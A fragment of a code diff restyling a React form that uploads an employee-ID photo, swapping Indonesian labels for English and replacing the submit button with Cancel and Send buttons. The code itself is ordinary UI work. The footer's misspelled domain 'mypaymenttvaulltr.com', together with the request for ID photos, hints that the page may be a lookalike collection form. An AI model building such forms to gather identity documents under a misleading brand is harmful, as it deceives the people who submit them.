+                onChange={e => { setEmpIdFile(e.target.files?.[0] ?? null); setErrors(p=>({...p,empId:""})); }} />
+              <button type="button" onClick={() => empIdRef.current?.click()}
                 style={{
-                  width: "100%", height: 80, background: errors.empId ? "#fff5f5" : "#fafafa",
-                  border: `1.5px dashed ${errors.empId ? "#e00" : "#ddd"}`,
-                  borderRadius: 6, cursor: "pointer",
-                  display: "flex", flexDirection: "column", alignItems: "center", justifyContent: "center", gap: 6,
-                  fontSize: 12, color: empIdFile ? "#111" : "#999",
-                  transition: "background 0.15s",
+                  width: "100%", height: 44, background: "#fff",
+                  border: `1px solid ${errors.empId ? "#c00" : "#ccc"}`,
+                  borderRadius: 4, cursor: "pointer",
+                  display: "flex", alignItems: "center", justifyContent: "center", gap: 8,
+                  fontSize: 13, color: "#444",
                 }}>
-                <Upload size={18} color={empIdFile ? "#111" : "#bbb"} />
-                <span style={{ fontSize: 11, textAlign: "center", padding: "0 4px", wordBreak: "break-all" }}>
-                  {empIdFile ? empIdFile.name : "Klik untuk unggah"}
-                </span>
+                <Upload size={15} />
+                {empIdFile ? empIdFile.name : "Choose Photo"}
               </button>
-              <FieldError name="empId" />
+              <Err k="empId" />
             </div>
           </div>
 
-          {/* Submit Button */}
-          <button
-            type="submit"
-            disabled={loading}
-            style={{
-              width: "100%", height: 52,
-              background: loading ? "#555" : "#111", color: "#fff",
-              border: "none", borderRadius: 6,
-              fontSize: 15, fontWeight: 600,
-              cursor: loading ? "not-allowed" : "pointer",
-              letterSpacing: "0.03em",
-              display: "flex", alignItems: "center", justifyContent: "center", gap: 8,
-              transition: "background 0.15s",
-            }}
-          >
-            {loading ? (
-              <>
-                <Loader2 size={18} style={{ animation: "spin 1s linear infinite" }} />
-                Mengirim Data...
-              </>
-            ) : (
-              "Lanjutkan →"
-            )}
-          </button>
+          {/* Buttons */}
+          <div style={{ display: "flex", justifyContent: "flex-end", gap: 12, marginTop: 8 }}>
+            <button type="button" onClick={() => navigate("/")}
+              style={{
+                height: 44, padding: "0 32px",
+                background: "#fff", color: "#111",
+                border: "1px solid #ccc", borderRadius: 4,
+                fontSize: 14, fontWeight: 500, cursor: "pointer",
+              }}>
+              Cancel
+            </button>
+            <button type="submit" disabled={loading}
+              style={{
+                height: 44, padding: "0 36px",
+                background: "#111", color: "#fff",
+                border: "none", borderRadius: 4,
+                fontSize: 14, fontWeight: 500,
+                cursor: loading ? "not-allowed" : "pointer",
+                opacity: loading ? 0.7 : 1,
+                display: "flex", alignItems: "center", gap: 8,
+              }}>
+              {loading
+                ? <><Loader2 size={16} style={{ animation: "spin 1s linear infinite" }} /> Sending...</>
+                : "Send"}
+            </button>
+          </div>
 
-          <p style={{ fontSize: 12, color: "#bbb", textAlign: "center", marginTop: 14 }}>
-            Sesi Anda aman dan terenkripsi.
-          </p>
         </form>
 
-        <div style={{ padding: "12px 28px 20px", textAlign: "center" }}>
-          <span style={{ fontSize: 11, color: "#ccc" }}>
+        <div style={{ textAlign: "right", marginTop: 20 }}>
+          <span style={{ fontSize: 11, color: "#bbb" }}>
             &copy; mypaymenttvaulltr.com | Terms of Use | Privacy &amp; Cookies
           </span>
         </div>
